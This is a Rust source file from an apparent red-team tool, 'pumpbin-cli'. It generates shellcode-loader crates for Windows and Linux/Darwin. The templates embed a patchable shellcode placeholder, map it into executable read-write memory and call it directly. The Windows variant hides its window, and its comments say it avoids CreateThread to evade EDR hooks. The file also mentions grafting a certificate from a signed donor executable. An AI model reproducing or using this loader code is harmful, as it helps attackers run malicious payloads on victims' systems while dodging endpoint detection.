//! Loader-crate scaffolding. Writes a buildable Cargo crate that
//! follows the PumpBin placeholder convention so authors don't have
//! to copy-paste `$$SHELLCODE$$` / `$$99999$$` magic strings by hand.
//!
//! Output of `pumpbin-cli new-loader <name>` is:
//!   <name>/Cargo.toml      (includes [package.metadata.pumpbin])
//!   <name>/build.rs
//!   <name>/src/main.rs
//!
//! After scaffolding, `pumpbin-cli pack <name>` builds the crate and
//! writes the `.b1n` in one step, reading the marker bytes, platform,
//! and binary type from the metadata block in Cargo.toml.

use anyhow::{anyhow, Result};
use std::fs;
use std::path::Path;

use crate::Platform;

pub const DEFAULT_PREFIX: &str = "$$SHELLCODE$$";
pub const DEFAULT_SIZE_HOLDER: &str = "$$99999$$";
pub const DEFAULT_PAD_BYTES: usize = 1024 * 1024;

/// Knobs for `write_loader_scaffold`.
#[derive(Debug, Clone)]
pub struct LoaderOpts {
    pub padding_bytes: usize,
}

impl Default for LoaderOpts {
    fn default() -> Self {
        Self {
            padding_bytes: DEFAULT_PAD_BYTES,
        }
    }
}

/// Concrete marker bytes for one scaffolded crate. Held in the
/// scaffold so the same values get woven into `build.rs`,
/// `src/main.rs`, and the Cargo.toml `[package.metadata.pumpbin]`
/// block consistently.
#[derive(Debug, Clone)]
struct Markers {
    /// Where PumpBin's `memmem` finds the shellcode region.
    prefix: String,
    /// Where PumpBin's `memmem` finds the size-holder slot.
    /// Length must match `prefix` length expectations for
    /// PumpBin's patcher (default 9 bytes for a 9-digit decimal).
    size_holder: String,
}

impl Markers {
    fn default_static() -> Self {
        Self {
            prefix: DEFAULT_PREFIX.to_string(),
            size_holder: DEFAULT_SIZE_HOLDER.to_string(),
        }
    }
}

/// Write a new loader-crate scaffold at `dest`. Errors if `dest`
/// already exists.
pub fn write_loader_scaffold(
    dest: &Path,
    name: &str,
    platform: Platform,
    opts: LoaderOpts,
) -> Result<()> {
    if dest.exists() {
        return Err(anyhow!(
            "scaffold destination already exists: {}",
            dest.display()
        ));
    }
    fs::create_dir_all(dest.join("src"))?;

    let markers = Markers::default_static();

    fs::write(
        dest.join("Cargo.toml"),
        cargo_toml(name, platform, &markers),
    )?;
    fs::write(
        dest.join("build.rs"),
        build_rs(&markers, opts.padding_bytes),
    )?;
    fs::write(dest.join("src/main.rs"), main_rs(platform, &markers))?;
    Ok(())
}

fn cargo_toml(name: &str, platform: Platform, markers: &Markers) -> String {
    let deps = match platform {
        Platform::Linux => "libc = \"0.2\"".to_string(),
        Platform::Windows => "windows-sys = { version = \"0.59\", features = [\"Win32_Foundation\", \"Win32_System_Memory\"] }".to_string(),
        Platform::Darwin => "libc = \"0.2\"".to_string(),
    };
    let platform_str = match platform {
        Platform::Windows => "windows",
        Platform::Linux => "linux",
        Platform::Darwin => "darwin",
    };
    format!(
        r#"[package]
name = "{name}"
version = "0.1.0"
edition = "2021"

[dependencies]
{deps}

[profile.release]
opt-level = 3
lto = true
strip = true
codegen-units = 1

# Read by `pumpbin-cli pack`. Operators don't edit this by hand: the
# `new-loader` scaffold writes it. Optional fields you can add:
#   author, description, plugin_version, max_len (omit = auto-measure)
# To bake a default post-build chain into every .b1n built from this
# crate:
#   [[package.metadata.pumpbin.post]]
#   id = "cert-graft"
#   config = {{ donor = "/path/to/signed.exe" }}
[package.metadata.pumpbin]
name = "{name}"
platform = "{platform_str}"
binary_type = "exe"
src_prefix = "{prefix}"
size_holder = "{size_holder}"
"#,
        prefix = markers.prefix,
        size_holder = markers.size_holder,
    )
}

fn build_rs(markers: &Markers, padding_bytes: usize) -> String {
    format!(
        r##"// Generates a shellcode placeholder file PumpBin's stamper patches
// at generate-time. The prefix and padding length are baked in by the
// scaffolder so this build.rs and Cargo.toml's
// [package.metadata.pumpbin] always agree on the marker bytes.
use std::{{fs, iter}};

fn main() {{
    let mut sc = b"{prefix}".to_vec();
    sc.extend(iter::repeat(b'0').take({padding_bytes}));
    fs::write("shellcode", &sc).expect("write shellcode placeholder");
    println!("cargo:rerun-if-changed=build.rs");
}}
"##,
        prefix = markers.prefix,
        padding_bytes = padding_bytes,
    )
}

fn main_rs(platform: Platform, markers: &Markers) -> String {
    match platform {
        Platform::Linux => linux_main_rs(markers),
        Platform::Windows => windows_main_rs(markers),
        Platform::Darwin => linux_main_rs(markers),
    }
}

fn size_holder_accessors(markers: &Markers) -> String {
    format!(
        r##"#[inline(never)]
fn get_size_holder() -> &'static str {{
    black_box("{size_holder}")
}}

#[inline(never)]
fn get_shellcode() -> &'static [u8] {{
    // After stamping, get_shellcode()[0] is byte 0 of your shellcode.
    // The placeholder prefix is overwritten. Do NOT add any offset.
    black_box(include_bytes!("../shellcode"))
}}

fn shellcode_len() -> usize {{
    // trim_matches strips the $$ delimiters so this works both pre-stamp
    // ("{size_holder}" parses as 0 → harmless noop) and post-stamp
    // ("000000460" parses as 460 → correct length).
    get_size_holder()
        .trim_matches('$')
        .parse()
        .unwrap_or(0)
}}
"##,
        size_holder = markers.size_holder,
    )
}

fn linux_main_rs(markers: &Markers) -> String {
    let accessors = size_holder_accessors(markers);
    format!(
        r##"//! Linux loader scaffold. Embeds a shellcode placeholder, extracts
//! the runtime length from the size-holder slot, allocates a
//! +x mapping with mmap, copies the shellcode in, and jumps.

use std::hint::black_box;
use std::ptr;

// Both accessors are `#[inline(never)]` + `black_box` so the
// optimizer can't prove the placeholders are unreachable and DCE
// them out of the binary. pumpbin-cli's stamp step finds the
// placeholders by byte pattern; if they get optimized away the
// pack step fails with PB-E0001.
{accessors}

fn main() {{
    let len = shellcode_len();
    // get_shellcode()[0] is byte 0 of the stamped shellcode: no offset needed.
    let sc = &get_shellcode()[..len];

    unsafe {{
        let exec = libc::mmap(
            ptr::null_mut(),
            sc.len(),
            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
            libc::MAP_ANON | libc::MAP_PRIVATE,
            -1,
            0,
        );
        assert!(exec != libc::MAP_FAILED, "mmap failed");
        ptr::copy_nonoverlapping(sc.as_ptr(), exec as *mut u8, sc.len());
        let f: extern "C" fn() = std::mem::transmute(exec);
        f();
    }}
}}
"##,
    )
}

fn windows_main_rs(markers: &Markers) -> String {
    let accessors = size_holder_accessors(markers);

    format!(
        r##"//! Windows loader scaffold. Embeds a shellcode placeholder, extracts
//! the runtime length from the size-holder slot, allocates execution
//! memory, copies the shellcode in, and calls it on the MAIN thread
//! via a direct function-pointer call.
//!
//! Why not CreateThread: it's IAT-resolved kernel32 and one of the
//! most-hooked APIs across every EDR. The main-thread direct call
//! pattern lets any anti-evasion logic live inside the shellcode
//! itself (Crystal Palace, sleep masks, etc.) instead of being
//! short-circuited by a hooked thread spawn.

#![windows_subsystem = "windows"]

use std::hint::black_box;
use std::ptr;
use windows_sys::Win32::System::Memory::{{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
}};
{accessors}

fn main() {{
    let len = shellcode_len();
    // get_shellcode()[0] is byte 0 of the stamped shellcode: no offset needed.
    let sc = &get_shellcode()[..len];

    unsafe {{
        let exec = VirtualAlloc(
            ptr::null(),
            sc.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        assert!(!exec.is_null(), "VirtualAlloc failed");
        ptr::copy_nonoverlapping(sc.as_ptr(), exec as *mut u8, sc.len());
        // Main-thread direct call. NO CreateThread / CreateRemoteThread.
        let f: extern "C" fn() = std::mem::transmute(exec);
        f();
    }}
}}
"##,
    )
}
